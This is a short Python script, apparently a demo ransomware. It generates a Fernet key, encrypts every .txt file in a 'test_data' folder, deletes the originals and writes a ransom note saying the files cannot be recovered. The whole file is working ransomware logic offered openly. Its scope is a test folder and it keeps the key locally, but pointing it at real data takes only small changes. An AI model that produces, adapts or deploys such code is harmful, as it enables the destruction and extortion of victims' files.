import os
from cryptography.fernet import Fernet

# This part will make a secure random key using AES-128 encryption
key = Fernet.generate_key()
with open("key.txt", "wb") as key_file:
    key_file.write(key)

fernet = Fernet(key)

# Here you can specify the folder where you want to encrypt files

target_folder = "test_data"

# This part will encrypt all .txt files in the target folder ONLY!
for file_name in os.listdir(target_folder):
    if file_name.endswith(".txt"):
        file_path = os.path.join(target_folder, file_name)
        with open(file_path, "rb") as file:
            data = file.read()
        encrypted = fernet.encrypt(data)
        with open(file_path + ".encrypted", "wb") as file:
            file.write(encrypted)
        os.remove(file_path)

# The last touch will leave a text file with a ransom note
note = """Your files have been encrypted!
To late to get them back now. """
with open(os.path.join(target_folder, "ransom_note.txt"), "w") as f:
    f.write(note)

print("[+] Files encrypted. Key saved in key.txt")
